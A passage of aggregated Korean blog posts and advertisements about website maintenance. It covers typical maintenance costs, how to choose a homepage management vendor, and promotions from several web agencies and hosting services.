건이라도 2-3번만 요청을 받아도 순수 인건비로만 최소 5만원이상이 발생하고 난이도에 따라 하루가 걸린다면 10만원 이상 발생합니다.​그렇게 되면 5-10만원 유지보수 비용으로는 사실 감당이 안 돼요.​프로그램 오류까지 잡아주는 유지보수를 해준다면 오류의 심각성에 따라서 몇 달치의 유지보수 비용이 업체 내부 인건비로 들어가게 되죠.​그래서 웹에이전시의 경우, 유지보수 항목을 이미지 제작과 html과 같은 리스크가 적은 것을 기준으로 비용을 책정하고 요청 횟수를 제한하여 계약을 해요.​웹 프로그램이 포함되게 되면 의뢰자 입장에서는 잘 모를 수 있지만 손실이 커지는 것은 기정사실 이예요.​그러다 보니, 결과적으로 유지보수 비용 대비 너무 자주 또는 요구 사항이 커지면 말은 못 해도 우선순위에서 밀리거나 일처리가 늦어질 수 있답니다.​ ​​02 초중급 기술자에 의한 유지보수 관리​대부분 홈페이지 개발업체의 유지보수는 초중급 기술자가 담당하는 것이 현실입니다. 따라서, 경험과 실력이 부족해서 문제 해결이 늦어지거나 어려울 수 있어요.​불특정 오류가 발생하게 되면 며칠이 걸리거나 해결이 안 되고 시간만 흘러갈 수 있다는 점도 참고하시기 바랍니다.​​03 고급기술자도 해결이 어려운 고난도의 오류나 복합장애의 발생​이러한 문제가 발생한 경우 뛰어난 개발자라고 해도 다양한 경험과 노하우가 부족하게 되면 원인을 찾는데 어려움이 있게 됩니다. ​프로그래밍 실력뿐만 아니라 서버, 네트워크에 대한 경험도 많아 다각적으로 접근이 가능해야 처리할 수 있는 문제는 고급기술자라고 해도 해결하기 어려울 수 있답니다.​트러블슈팅에서는 웹에이전시나 개발업체가 해결하지 못하는 이런 오류와 장애를 처리해 주다 보니 가끔 경험하는 일이에요.​​  ​중소기업 홈페이지 관리 유지보수 현명한 선택 방법​중소기업 홈페이지 유지보수 비용은 서비스를 제공하는 업체의 규모, 서비스 종류, 횟수에 따라서 가격차이가 많이 나는데요.​먼저, 서비스 업체의 규모에 따른 유지보수를 대략 살펴보고 최종 선택 기준을 살펴볼게요.​ 규모가 큰 중견 대기업급 홈페이지 관리 업체​대기업급 홈페이지 유지보수는 동일한 서비스를 제공하는 중소기업과 비교해 최소 2배에서 10배(?)까지 비용 차이가 발생해요.​이곳에는 회사의 이미지와 신뢰성을 보고 맡기거나 서비스 프로세스가 좋아서 아니면 실력이 좋을 것 같아서 신청하는 경우가 아니라면 실속적인 측면에서 중소 홈페이지 유지보수 업체의 비용 대비 큰 메리트나 이득은 없다는 생각이 들어요.​아, 한 가지 중요하다고 할 수 있는 서비스를 제공하는 업체가 있는데요. 바로 24시간 고객지원 시스템 가지고 있다는 것이에요.​비상시 야간에도 바로 연락할 곳이 필요하다면 고려 대상이 될 수 있죠. 하지만, 이것도 다 비용이라 횟수가 제한되어 있고 추가 비용이라고 보시면 됩니다.​​ 중소 웹에이전시 홈페이지 관리 업체​중소 홈페이지 개발업체의 유지보수는 아주 저렴한 가격부터 다양하게 서비스 비용이 책정되어 있는데요.​웹에이전시와 같은 홈페이지 제작업체가 제공하는 유지보수 서비스를 살펴보면 보통 메인/팝업 이미지 제작, htlm 콘텐츠 추가/변경, 게시판 추가 등 기술적인 부분보다는 웹디자인과 단순 작업에 초점이 맞추어져 있어요.​비용을 보면 몇 만원부터 수십만원까지 서비스 항목별로 제공 횟수에 따라 기본, 고급, 프리미엄 등과 같은 이름으로 유지보수 비용을 책정하는 단순한 방식이 일반적이죠.​시간과 비용적인 리스크가 상당히 큰 프로그래밍적인 요소들은 기본 서비스에서 모두 빠져 있고 프로그램 기능 개발은 별도의 비용을 산정한답니다.​중소기업 홈페이지 유지보수업체에서도 웹에이전시의 이름이 잘 알려지고 유명한 경우에는 비용이 다소 올라가는 경향이 있으니 비교해보시고 잘 선택하셔야 해요.​그렇다고, 너무 싼 곳만 찾으면 문제가 생길 수 있다는 것 아시죠?​​ ​​마지막으로 홈페이지 관리 업체 선택 시 최종 기준이 될 수 있는 것에 대해 알아볼게요.​앞서 대기업 고가 유지보수 업체의 특징이 홈페이지 유지보수 대응 프로세스와 신뢰성이라고 했는데요.​다음 3가지 사항을 잘 고려하여 홈페이지 관리 업체를 선택한다면 적정 비용에 좋은 보험이 될 수 있는 유지보수 업체를 선택할 수 있을 거라 생각해요.​01 작업 요청 시 서비스가 잘 이루어질 수 있는 곳인지?​비용이 싸다고 무조건 맡겼다가 연락이 어렵거나 요청한 일처리가 느려서 스트레스를 받을 수 있으니 잘 선택해야 해요.​유지보수 비용이 저렴한 곳은 가격이 싼 만큼 월 단위 비용 결제가 아닌 1년 단위로 선결제를 요청하는 경우가 많아 업체를 바꾸려면 고민이 되거나 남은 비용을 포기해야 할 수 있어요.​​조금 비싸더라도 월 단위로 비용결제하는 곳을 선택하는 것을 추천드려요.​만약, 유지보수가 마음에 들지 않는다면 다음 달부터 다른 홈페이지 관리 업체로 변경하면 되므로 그렇게 리스크가 크지 않으니 고려해 보시길 바래요.​​02 오류 장애 발생 시 문제 해결이 가능한가?​웹디자인이나 콘텐츠 수정과 같은 것은 빠르게 잘 처리해 주는데, 프로그램에 문제가 생기거나 시스템에 장애가 발생하는 경우 잘 대응이 안되는 업체가 있어요.​주로 일반 기업 홈페이지나 랜딩페이지 등과 같은 눈에 보여지는 html 페이지 작업이나 디자인을 잘 하는 웹에이전시가 그러한 경우가 많아요.​물론, 웹에이전시도 실력 있는 업체도 많이 있지만 기술적인 면에서는 SI와 같은 개발업체가 프로그래밍 능력이 더 뛰어나다는 사실을 알고 있어야 해요. ​ ​03 기타 콘텐츠 관련 서비스 외에 어떤 서비스를 부가적으로 제공하는가?​대부분 웹에이전시 홈페이지 제작업체는 이미지, html, 게시판, 관리자 등 우리가 잘 알고 있는 부분에 유지보수 범위를 한정하여 서비스를 제공하고 있는데요.​부가적인 서비스라고 볼 수 있는 웹 소스와 DB 데이터 백업 관리, 프로그램 오류 수정, 보안관리, 시스템 점검 등을 제공하지 않고 있어 별도의 비용이 발생할 수 있으니 잘 알아보셔서 선택한다면 다양한 서비스도 받으면서 다소 비용을 절약할 수 있어요.​홈페이지 관리 유지보수라는 것을 앞서 설명하였다시피 단편적인 면만 보고 어디가 싸다 비싸다고 말하기 어려울 수 있으니 내게 필요한 서비스가 정확히 무엇인지 먼저 결정하셔야 해요.​그러고 나서, 위와 같은 기준을 잘 참고하시면 비용 차이에 대한 이해도가 어느 정도 생겨서 현명한 선택을 할 수 있을 것으로 생각됩니다.​​  ​제가 아는 모 쇼핑몰을 운영하는 사업자분은 유지보수는 별도로 하지 않지만 웹호스팅 업체에 백업 복구만 별도로 신청하여 이용하고 있는 분이 있어요.​그런데, 단순 백업 관리만 해주는데 들어가는 비용이 월 10만원이라고 해요.​이 비용이면 누군가는 유지보수를 맡기겠다고 하시는 분도 있을 거고 비싸다는 분도 계실 거예요.​제가 보기에도 백업 관리에만 좀 아깝다는 생각이 들지만 본인이 필요한 서비스 하나만 선택한 결정이고 다른 어떠한 이유도 있을 수 있어 제3자 입장에서 왈가불가하기는 어려울 듯해요.​​모두가 홈페이지 유지보수나 관리가 필요한 것은 아닐 것입니다. ​홈페이지를 이용한 비즈니스를 하고 있거나 기타 사유로 유지보수가 필요하다면 내게 필요한 서비스가 무엇인지 먼저 생각해보시고 위의 기준을 잘 참고하여 판단을 하신다면 좀 더 나은 선택을 할 수 있을 것입니다.​​​@ 홈페이지 유지보수 비용 참고하면 좋은 글 홈페이지 유지보수 비용에 대한 오해지금처럼 인터넷이 발달하지 않은 과거에는 응용 프로그램 개발과 홈페이지 제작과 같은 작업외에 기술적인...blog.naver.com ​전문가의 무료 IT도움이 필요하신 분은 언제든 편하게 메시지 남겨주세요.​감사합니다.​ 홈페이지 제작하고1년에 웹호스팅비만 30만원 넘게 내신다구요? 이런 고민을 해결해 줄 피부관리실, 헤어샵, 네일샵, 두피관리실 고객관리프로그램 (주)피에스포유 스마트쌤의 저렴하면서도 기능들과 디자인을 갖춘  홈페이지가 있습니다.  ﻿﻿﻿﻿ 홈페이지 제작을 했지만, 회원관리와 홈페이지 관리가 되지 않는 경우가 많습니다. ﻿그러나, 고객관리프로그램 (주)피에스포유 스마트쌤 홈페이지 웹호스팅비를 받지 않습니다. 원장님께서 고객관리프로그램만 사용 하시면 됩니다. 웹호스팅비 보다 저렴한 고객관리 프로그램을 사용하시면 고객관리 뿐만 아니라 기능성과 디자인을 갖춘 홈페이지를 사용하 실 수 있습니다. PC, 모바일에서 홈페이지 사용이 간편하며 핸드폰으로 사진을 찍어서 바로바로 올릴 수 있습니다. ﻿이러한 저렴한 홈페이지를 고객관리 프로그램 (주)피에스포유 스마트쌤에서만 이용 하실 수 있습니다.    www.smartcem.kr  1577-1521﻿ ﻿ 네이버 블로그는 맞지만, 확인불가블로그 홈페이지 관리지속적으로 관리하기 힘드시죠?아침을 담다에서 도와드리겠습니다​블로그 홈페이지란 기존 블로그의 레이아웃과 달리 기업 또는 브랜드와 맞게,홈페이지 형식의 블로그를제작한 것을 의미합니다.​잘 키운 블로그 홈페이지는 원하는 키워드를 잡아 고객층 확보가 더 쉽습니다.블로그 홈페이지로 접근성을 더 높일 수 있지만막상 관리를 하면 블로그와 마케팅에 대해 전문가가 아닌 이상은 생각보다 어렵습니다.​아침을 담다의블로그 홈페이지 관리 필요성​브랜드의 이미지에 걸맞은 스킨과 타이틀그리고 자유로운 카테고리 위젯의 형식으로더욱 뛰어난 접근성을 가진 블로그로 리뉴얼 합니다.​전문성 있는 아침을 담다만의 차별화된 블로그 홈페이지 관리의 필요성을 느껴보세요!​블로그 관리뿐만 아니라1일 1포스팅 (월 30회)2일 1포스팅 (월 15회)등의 ​꾸준한 포스팅 서비스로 홈페이지에 대한 접근성을 높여줍니다.​홈페이지 6개월 이상 관리 시블로그 홈페이지 무료 제작1년 계약 시 1개월 추가 관리 서비스아침을 담다의 장기 관리 플랜도 만나보세요​블로그 홈페이지의 적합한 업종전문 직종, 병원, 학원 등​아침을 담다는업종과 상황을 고려하여고객사에 맞는 마케팅을 컨설팅합니다.​천안, 아산, 평택, 세종, 청주 등충남지역 많은 분들이 만족하고 계십니다​​상담문의는 아래 전화로 부탁드립니다^^아침을 담다는 언제든 환영합니다 ​ ​  ​​아름다운 꽃 ~!​코로나로 인해 경기가 많이 힘들어 졌죠~ ​이럴때 일수록 더욱 으쌰으쌰 해야 할거 같아요 ​​그래서 기분전환을 해보았습니다.​  ​화창하니 코로나가 사라질거 같은 상쾌함이 드네요.​가족과 기분전환을 하고 왔습니다.​마스크를 쓴 얼굴이라 사진은 배경 위주로만 찍었습니다.​그래도 기분은 좋으니 이럴때 힘을내어 홈페이지 관리와 블로그포스팅을 진행하게 되네요~​사실 잘하는게 많지는 않으나 그나마 꾸미는 것을 좋아하는 저로서는 수정 및 관리와 포스팅이라 생각이 됩니다.​이러면서 홍보효과를 본다면 크윽~! 이것보다 좋은일은 없는거 같아요​홈페이지 수정 및 관리 와 블로그 포스팅이 궁금하시죠?​제가 글쓰는 솜씨가 보통(?)아니라서 비밀인데요..​하나는 자신 있어요 글을 잘쓴다는 거 입니다.​그러기 때문에 꾸미는 것도 좋아하는 거 같습니다.​  가족과 나들이 중에 너무 이뻐서 저도 모르게 사진을 몇장 찍게 되네요.​이왕이면 보기에도 좋은 꽃이니 간직하기도 좋고 기억에 남을 거 같아요 ​​사진 찍는 솜씨도 있어보이네요 ㅎㅎ ​​홈페이지를 제작하면 수정이 힘들다가 아닌 안된다는 소리를 많이 듣게 되는거 같아요 아무래도 홈페이지를 자체를 구매해서 그런듯 하는데..사실 전문적으로 교육을 받고 진행하지 않으면 홈페이지 관리 힘들수도 있다는 생각이 들어요​그렇기 때문에 믿고 맡길 수 있는 곳을 통해 의뢰를 하는게 제일 안전하다는 생각이 들어요 지인분께서 오래전에 큰맘먹고 홈페이지를 구매한적이 있는데...​구매를 한 홈페이지에 대한 사용설명이 없다보니까​만지지도 못하는 홈페이지가 되어 지금은 어디있는지 조차도 모를 뿐아니라 도메인주소가 살아 있는지도 모른다는 지인이 있다보니​아~ 수정관리가 필요한부분이겠구나~~라고 느꼈습니다.​상품도 구매하면 A/S가 되는지를 많이 물어보듯이 홈페이지도 수정관리가 되는지를 여쭤보는건 중요한 부분 같아요 ​혹시라도... 상담을 원하시면 전화주세요믿음직한 상세한 상담. 이해가 쏙 가는 상담을 해드릴 수 있어요​문의전화tel. 010-5443-9769​#와짱홈페이지 #와짱홈페이지제작 #와짱블로그 #와짱블로그제작 #와짱블로그포스팅​​​ 요즘에는 자영업자, 소상공인분들도 사업에 있어 홈페이지 하나 정도는 필수로 갖추고 있어야하는 요건이라고 생각하고, 그렇게 자리 잡혀있는데요, 소비자들에게 보여지는 부분이다보니 필수가 된것인데요, 소자본으로 시작하는 분들이 초반에 신뢰도나 전문성 등을 형성하기 위해 가장 좋은 수단이 브랜드 홈페이지를 만들어 소비자들에게 보여주는 것입니다. 코로나19 바이러스 영향이 크고, 길어짐에 따라 언텍트 산업이 발전했는데요, 때문에 오프라인 컨텐츠는 점점 줄어들고 반대로 온라인 컨텐츠는 점점 늘어나고 있습니다. 이제는 오프라인 컨텐츠가 온라인으로 대체되는 경우도 빈번하게 생기고 있는 만큼 온라인에 집중해야하는 시대입니다. 이러한 흐름 속 아직 본인 브랜드의 홈페이지가 없다면 전문성도 떨어져보일뿐 아니라 주력하고자하는 서비스나 제품에 대해서 소비자들에게 자세하게 어필하기 쉽지 않아지는데요, 이러하 이유들로 인해서 자체 홈페이지에 대한 중요성도 더욱 커지고 있습니다. 홈페이지를 제작하는 것도 쉬운일이 아니지만 이를 꾸준하게 유지하고 좋은 컨텐츠를 마련하여 사람들을 계속해서 유입시키며 어느정도의 방문자를 유지시키는 것도 사실상 쉽지 않은 것이 현실입니다. 노하우가 있으면 몰라도 아무런 전략 없이는 관리가 수월하지 않죠. 사업을 시작하는 사람들 대부분 이러한 상황이 익숙하지 않기 때문에 어떻게 시작해야하는지 혹은 관리를 어떻게해야하는지 감이 잘 잡히지 않는데요, 그러다 해결책으로 홈페이지관리업체를 찾아보게 됩니다. 홈페이지관리업체도 다양하기 때문에 이를 이용한다고해서 무조건 효과를 보는것도 아닌데요, 때문에 홈페이지관리업체를 고를 때 더욱 신중하게 고르셔야합니다. 이런 부분에 있어 애드크라운은 다양한 노하우와 경험을 통해 업종에 맞는 홈페이지를 제작해드릴 수 있어 광고주분들이 큰 만족감을 느끼고 있습니다.  홈페이지관리업체이면서도 제작까지 해드리고 있기 때문에 여기에 맞는 홍보까지 가능한것인데요, 나아가 시너지 효과를 누릴 수 있는 마케팅 수단까지 같이 활용한다면 더욱 높은 효과를 기대하실 수 있습니다. 홈페이지는 만들어났지만 실질적으로 이를 통한 문의나 고객 유입이 되지 않는다면 효과를 기대할 수 없는데요, 잘 만드는 것도 중요한만큼 그 후에 어떻게 관리하느냐도 중요합니다. 고객과의 소통을 할 수 있어야하고, 이용하는데 있어 불편함은 없는지 체크해야합니다. 또한, 지속적으로 컨텐츠를 올리고 혹은 교체해주면서 정보를 제공하는게 좋고 이에 대한 반응은 어떤지 등 세심한 체크가 필요합니다. 이러한 이유들로 인해 단순하게 페이지를 만들어주는 곳이 아닌 관리까지 같이 해주는 홈페이지관리업체를 찾으셔야한다는 것입니다. 비용을 들여서 만들어놨는데 관리 소홀로 인해 가치없는 페이지로 전락해버이지 않게 세심한 관리는 필수입니다. 나중을 위해서라도 혼자 만들고 관리하기보다는 홈페이지관리업체를 통해 확실하게 채워나가는 것이 효율적입니다. 애드크라운에서 홈페이지에 제작 및 관리에 나선만큼 전문성과 신뢰도를 느낄 수 있는 페이지를 제작해드리는데요, 제작과 관리는 물론 더불어 여러 가지 전략을 바탕으로 마케팅을 실행할 수 있는 온라인마케팅대행사입니다. 디자인과 영상편집, 블로그 컨텐츠 등 제작이 가능하고 전문 마케터가 상주하고 있기 때문에 각 분야에 맞는 업무를 진행해드릴 수 있습니다. 홈페이지관리업체를 알아보고 있는 상황이라면 애드크라운에게 지금 바로 문의주시기 바랍니다^^! 애드크라운경기도 화성시 동탄순환대로 830 동탄 SK V1 center 905호 ​ ​ ​ ​SMART 고객관리홈페이지가 신규로 오픈했습니다!  ​이용자분들이 많이 늘어남에 따라홈페이지 또한 별도로 개편되었습니다.​고객님들의 소중한 의견도 많이 모아져더욱 더 편리한 프로그램이 되었습니다.​이용해주셔서 진심으로 감사드립니다.더욱 더 발전하는 유비플러스가 되겠습니다.​ ​​​​​ 홈페이지유지보수 홈페이지를 운영하시고 계시다면 하이퍼웹(www.hyperweb.kr)과 함께하세요!​홈페이지는 제작했는데 막상 직접운영하시려면 어려움이 많죠!디자이너를 채용하자니 디자이너비용과 장비를 구축하자니 부담되구요!!!!그럴땐 홈페이지유지보수 전문 하이퍼웹에 문의하세요!!​홈페이지제작업체가 갑자기 사라지셨다구요?최근 코로나로 인하여 많은 중소기업들이 견디다 못해 폐업을 하고 있습니다.지금까지 홈페이지를 관리하던 업체가 갑자기 사라지셨다구요?그럴땐 홈페이지유지보수 전문 하이퍼웹에 문의하세요!!​홈페이지유지보수업체가 마음에 들지 않으시다구요?사람마음이 달라 홈페이지유지보수업체와 맞지 않아 불만이신경우홈페이지유지보수 전문 하이퍼웹에 문의하세요!​홈페이지유지보수를 신청하시기 위해서는 몇가지 필요한것이 있습니다.첫번째로 FTP계정정보를 아셔야 합니다. 호스팅을 이전하시려고 하시면 FTP계정정보를 알려주시거나 기존업체에 백업을 요청하셔서 주셔야 합니다.유지보수를 신청하시는경우(1년계약) 간단한 호스팅이전비용은 무료로 진행해 드립니다.​ 홈페이지유지보수 홈페이지 제작 후 중요한 유지관리 안정적이고 지속적인 운영을 위한 ‘기간 별 유지보수’ 수정관리가 소량이 걍우 ‘건별 유지관리’ 가장 합리적인 유지보수 방법을 제안하여 가장 합리적인 방법으로 진행합니다. ​ 계약을 체결하신 고객님들에 6개월 또는 1년 제공해드리는 유지보수입니다. 자체적으로 홈페이지 유지가 어려운 업체에 전문가의 관리를 제공해 드리며, 매월 수정 및 변동사항이 발생하는 고객님들께 적합합니다. 귀사의 특성에 따라 수정사항이 자주 발생할 경우 연간이용횟수 내에서 충분한 서비스를 받으실 수 있게 됩니다.​ 유지보수비용은 다음과 같습니다! 정기적 유지보수외에 건벌 수정비용은 별도로 연락주시면 보내드리겠습니다.​ 유지보수 계약후 하이퍼웹의 유지보수신청게시판에 수정하실 사항을 남겨주시면 확인후 작업을 진행하며 작업이 완료되면 담당자분께 연락드려 검토를 요청드립니다.​ 홈페이지 유지보수가 필요하실경우 하이퍼웹과 상의하세요!홈페이지유지보수문의 : 070-7518-1114​  #홈페이지유지보수, #홈페이지수정, #하이퍼웹​​ ​​고령화가 늘어남에 따라요양원이 많이 생겨나면서 요양원홈페이지를 제작하려는 원장님들이 많이 계실 거라 생각합니다.하지만 요양원 홈페이지 제작, 하나부터 열까지 쉽지 않습니다.그렇기 때문에 오늘은 요양원 홈페이지제작기업, 느티나무넷에 대해 소개해드리려 합니다.다양한 홈페이지 제작 기업이 있지만 그 중 느티나무넷을 선택해야 하는 이유, 지금부터 설명 드리겠습니다. ​​​ ​​저렴한 비용의 합리적인 요양원홈페이지 제작기업, 느티나무넷은 20년 가까이 홈페이지를 제작 운영하고 있는 안정적인 기업입니다.10여년 디자인제작 경험이 있는 디자이너가 감각적으로 만든 디자인을 33만원의 거품없는 착한 구축비용으로 제공합니다. 또한 월 22,000원의 저렴한 월사용료로 홈페이지를 부담없이 사용할 수 있습니다. ​​​​ ​요양원 스타일에 맞는 기본이미지를 제공하여 요양원에서 주시는 사진이 적더라도 홈페이지 제작이 가능합니다.언제든 직접 게시판, 자료실, 사진앨범을 무제한으로 생성하고 사용하는 것이 가능하니 최신 이미지를 업데이트할 수 있습니다. ​​​​ ​홈페이지 수정 시스템 제공으로 메인화면 이미지 교체, 문구수정, 콘텐츠수정등을 직접 쉽고 빠르게 수정할 수 있습니다.디자이너가 아니어도 홈페이지 디자인을 한글이나 파워포인트 문서수정 하듯이 수정할 수 있는 시스템과 샘플들을 제공하여 누구나 쉽게 수정할 수 있습니다. 혹시라도 수정을 하다 실수한 경우에도 제공된 자동 복구 기능을 제공하여 버튼한번 클릭으로 바로 원상복구가 가능합니다. ​​​​​ ​요즘 정보를 찾을 때 가장 많이 사용하는 것은 사실 스마트폰입니다.느티나무넷은 반응형기반의 홈페이지 제작으로 PC, 태블릿 뿐 아니라 스마트폰용 홈페이지로도 구축이 되기 때문에 홍보의 효과를 더욱 높일 수 있습니다. 컨텐츠 또한 PC/태블릿/스마트폰 형식으로 각각 제작할 수 있어 다양한 기기에서 보기 편한 디자인 작업이 가능합니다.​​​​ ​팝업 운영도 팝업 제작 시스템으로 업체에 의뢰하지 않고 직접 등록할 수 있습니다. 다양한 팝업 샘플을 선택만하여 텍스트만 변경하면 팝업등록을 쉽게 완료 할 수 있어서 컴퓨터를 알지못하더라도 손쉽게 관리를 할 수 있습니다​​​ ​그룹과 레벨에 대한 자동 승인 기준을 설정만 해놓으면 레벨과 그룹이 자동 변경되어 회원관리가 더욱 수월해집니다. 회원의 레벨과 그룹을 설정할 수 있으니 체계적으로 회원관리가 가능합니다홈페이지 관리시 모르는 기능들은 도움말 기능을 통해 바로바로 확인하여 해결할 수 있습니다. 또한 관리자보안설정기능으로 관리자 계정을 타인이 부정하게 사용하는 것을 방지하도록 3단계에 걸쳐 보안을 강화하여 안심하고 관리 할 수 있습니다​​ ​​월 22,000원 합리적인 가격으로 요양원홈페이지를 제작하고 운영하는 법다양한 기능과 20여년의 노하우가 담긴 느티나무넷으로 시작해 보시는 건 어떨까요?​​ 느티나무넷복지관 요양원 홈페이지 제작, 스마트폰 홈페이지, 쉽고 편한 관리 시스템www.neutinamu.net ​​ 네이버 블로그는 맞지만, 확인불가한참 인터넷 생활 할 때 만큼은 아니지만.. 그래도 그럭 저럭 여기 저기 관리중인 곳이 있는데... 1. 야오이쪽 합동 홈페이지 2. 구관쪽 개인 홈페이지 3. 이글루 4. 싸이월드 5. 네이버 블로그 이상 5개 관리 중... 그 중 가장 소홀했었던 블로그는 얼마전에 살렸고... 지금은 개인 홈페이지를 열심히 업데이트 하고 있습니다. 이글루에서 구관에 관한걸 뺐더니...자연스럽게 관리가 되더군요. 그런 이유로 앞으로 구관쪽 사진들은 네이버 블로그, 싸이월드, 개인 홈페이지 이렇게 세군데만 열심히 관리 하기로... 과거에 찍었던 사진들 홈에 올리고 있는데 아 귀찮습니다. 그 전에 같은 날짜가 3개 이상 되면 웬지 싫어서 텀을 두고 올리고 있다능... 우짰든 오늘도.. 내일 일본가는 주제에 홈페이지에 지난 사진들 올리고 있다는... 그런 이유에서 구관쪽 홈페이지 주소 공개!! http://erytheia.cafe24.com 그리고 이글루 주소 공개..(구관을 빼고는 네이버 블로그와 별로 다를거 없는 곳, 오히려 소소한 잡담 및 일상은 더 잘 올라온답니다.) http://choryung.egloos.com홈페이지는 다양한 솔루션으로 제작을 합니다. 워드프레스기반으로 된 것들이나 그누보드 또는 자체 개발된 솔루션으로 제작을 하게 되죠. 문제는 홈페이지 관리입니다. 제작업체에 비용을 지불하고 관리를 위탁하면 되지만 대부분의 홈페이지는 한번 만들어두면 거의 손대지 않는 경우가 많아서 굳이 비용지불을 하지 않으려 합니다. 그러다 홈페이지에 들어가 있는 사진을 교체하거나 연혁에 한줄을 넣거나 팝업창을 띄워야할 경우 홈페이지에 전문지식이 없는 사람들은 어려움을 겪게 됩니다. 그제서야 부랴부랴 홈페이지 업체에 연락하게 되지요. 하지만 홈페이지는 백업도 해야하고, 메인 이미지라도 한번씩 교체해주어야 방문자들에게 호감을 줄 수가 있습니다. 비전문가에 의해 홈페이지가 손상되면 전문가에게는 아무리 간단한 것이라도 업체는 결코 무료로 복구하지 않습니다. 그러니 제작을 무엇으로, 어디에서 하였던지 홈페이지 관리를 저렴하게 아웃소싱하는 전문가를 찾으세요. 굿튜브에서 제공하고 있습니다.​http://goodtube.kr/keep/ 홈페이지관리 – 굿튜브월5만으로 해결하세요! 페이지를 수정하고, 이미지를 바꾸고 파일을 등록하는 등 일상적인 홈페이지관리는 전문가에게 아웃소싱하세요! 시간절약 HTML에 익숙하지 않아 스트레스 받지 말고 시간을 절약하세요! 비용절감 인건비를 절감하고 저렴한 비용으로 퀄리티로 있게 관리해드려요. 편리함 언제든지 카톡, 메일, 문자, 요청게시판을 활용하세요! 안전함 백업은 기본! 홈페이지를 안전하게 백헙하고 관리해드립니다. 문의·상담 Contact us!goodtube.kr ​ 많은 홈페이지가 포털사이트에 등록이 되어 있습니다. 관리가잘되고 있는 홈페이지 와 관리없이 당치되어 있는 홈페이지가   일하시면서 홈페이지 관리하기 힘드신 부분들이 있어독립형홈페이지 제작 과 포털사이트 무료등록   관리까지  한번에 할수 있어  정보 확인까지 가능하세요#홈페이지제작 #독립형홈페이지 #포털사이트홈페이지 #홈페이지관리 ​​홈페이지 제작  사이트 무료등록  관리까지​02-6006-4783 ​회사 홈페이지 주소가  머~~니  하고 물어보면  대부분 모르고 사용하고 있는 임대형 홈페이지 입니다.대부분 사업하시면서 대충 홈페이지를 만드시는 성향들이 많이 있으신대요일단 회사이름이 있는 내 홈페이지 이름 정도는 알고 있어야  하지 않을까 싶습니다.http://바른웹.com/홈페이지 주소는 쉽고 간단하게도 좋을것같아요 ~~​ ​모든 기업은 이윤을 추구합니다, 내 사업에 홈페이지 제작을 추가하는 것도 더 큰 이윤에 기여시키기 위해서죠, 홈페이지 제작업체도 마찬가지 입니다.눈속임으로 돈만 벌려고 하느냐 제대로 해주고 정당한 대가를 받고 있는냐 차이 인것 같습니다.인터넷 공간의 활용이 더더욱 커지고 있는 시점에 알수 없는 도메인 주소와 관리 안되어고민 하지 마시고  홈페이지 제작  포털사이트 무료등록 관리까지 확인해보세요 ​ ​ ​질문기업 쇼핑몰 홈페이지 관리 업체에 관하여​현제 다니는 회사에서 쇼핑몰 관리 업체에 월 50만원씩 주고 관리를 맏기고 있습니다.​홈페이지 제작할때도 디자인금액을 몇백만원 들여서 만들었다고 하는데​저희 회사 용도와는 잘 맞지 않을 뿐더러 그 금액을 주고 만든 것이 이해가 안됩니다.​이번에 홈페이지를 리뉴얼하려고 하는데​계속 그업체에 맡겨야 되는지 그정도 금액을 지불하는 것이 맞는지 알고 싶습니다.​현제 그 업체에서 해주는것은 저희쪽에서 요청하는 상품 업데이트나 사진 업데이트, 공고문 정도 입니다.​이정도 해주는데 월 50만원이 적당한 금액인가요?​아니면 이정도 금액 선에서 저희가 요청을 어느정도 할 수 있는건지 알고싶습니다.​그리고 만약 다른 업체에 맡긴다면​관리 금액과 홈페이지 리뉴얼 금액을 알고 싶습니다.​​답변안녕하세요. 기업 쇼핑몰 홈페이지 관리에 대해 질문해 주셨군요.​기업 쇼핑몰 홈페이지 유지 보수와 관계된 부분은 작업의 분량 및 난이도에 따라 결정되는 것으로 ​금액으로만 판단하기는 어렵습니다. 상품 업데이트라는 것이 월간 몇 개인지 상세페이지 디자인이 들어가는지 이벤트, ​프로모션이라 하면 한 페이지 정도로 요약 가능한 분량인지 스크롤을 쭉 내릴 만큼 내용이 많은지에 따라 가격 책정은 달라집니다. 월별 꾸준한 유지 보수가 필요한 경우라면 처음 계약 시 유지 보수 비용 및 범위를 정확히 한 후 서비스 받으시는 것이 나으며,​사실상 매달 유지 보수 건이 발생하지 않는다 한다면 발생 건별 견적을 내어 진행하는 것이 좋습니다. 기업 쇼핑몰 홈페이지의 제작 단가 역시 문의하신 내용 만으로는 가늠하기가 어려운 것이 현실입니다.​업체마다 구현해 낼 수 있는 퀄리티는 정해져 있습니다. ​그것은 업체의 홈페이지상 포트폴리오를 확인하시면 충분히 알아보실 수 있으며 프로그래밍이라고 한다면 ​카페24 등의 쇼핑몰 템플릿을 이용하는지 맞춤형으로 전체를 제작하는지에 따라 견적이 달라집니다. 쇼핑몰 템플릿을 이용하신다고 하면 제작 단가는 낮아질 것이고 향후 원하시는 대로 ​사이트를 변형 또는 신규 콘텐츠를 추가하는 데에 어려움이 있으실 것이고 직접 제작이라 하면 단가는 올라가고 대신에 사장님께서 원하시는 대부분의 모든 것을 맞춤으로 진행하여 사이트에 적용 가능할 것입니다.​월 50만 원씩이나 기업 쇼핑몰 홈페이지 유지 보수를 맡기는 건 낭비라고 생각합니다.​보다 자세한 상담이 필요하시다면 '에이디커뮤니케이션'으로 문의 부탁드립니다. ^^​감사합니다.​  http://www.adcomm.kr 에이디커뮤니케이션홈페이지제작,반응형홈페이지제작,쇼핑몰제작,모바일홈페이지제작,홈페이지디자인,기업홈페이지제작,홈페이지수정,각종 솔루션 제작,인천홈페이지제작 전문업체.www.adcomm.kr 홈페이지를 제작하다보니 클라이언트가 기존 홈페이지 관리가 어려워 리뉴얼을 의뢰하는 곳이 많습니다.주식화사에이앤디는 웹페이지로 구성된 것중 자주 바뀌지않는 곳은 웹코딩을 진행하고 있고 자주 바뀌거나 중요한 곳은 의뢰인이 CMS로 관리 할 수 있도록 만들고 있습니다.CMS작업시 중요한것은 홈페이지 담당자가 쉽게 관리 할 수 있도록 작업하는 것이고, 오류가 나지 않도록  체계적으로 시스템을 구축해 놓아야하는 것입니다. 구축비용이 저렴하다고 홈페이지를 만들다보면 정작 담당자가 할 수 있는일이 없어 구축회사에 지속적으로 수정을 요청하기때문에 유지보수비가 올라가거나 구축회사가 연락이 안되기도 합니다.​처음 사이트를 만드실때, 완벽한 기획을 갖고 오시는분은 거의 없습니다. 주식회사에이앤디는 홈페이지기획부터 클라이언트와 같이 도와드리고 있습니다.​관리자가 쉽게 관리 할 수 있는 홈페이지를 구축해 드립니다.사회적기업, 마을기업, 협동조합 등의 홈페이지 구축도 기획부터 제작까지 같이합니다. 